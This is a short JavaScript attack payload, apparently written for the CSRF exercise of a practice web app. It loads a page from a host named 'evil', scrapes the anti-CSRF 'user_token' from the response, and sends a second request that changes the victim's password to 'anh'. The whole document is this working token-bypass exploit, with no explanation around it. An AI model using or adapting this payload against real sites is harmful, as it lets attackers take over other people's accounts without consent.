var newpass = "anh"
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://evil/vulnerabilities/csrf/', false);
xhr.onload = function() {
    var doc = new DOMParser().parseFromString(this.responseText, "text/xml");
    var csrf = doc.getElementsByName("user_token")[0].getAttribute("value");
    var xhr2 = new XMLHttpRequest();    
    xhr2.open('GET', `http://evil/vulnerabilities/csrf/?password_new=${newpass}&password_conf=${newpass}&Change=Change&user_token=${csrf}`, false);
    xhr2.send(null);
};
xhr.send(null);
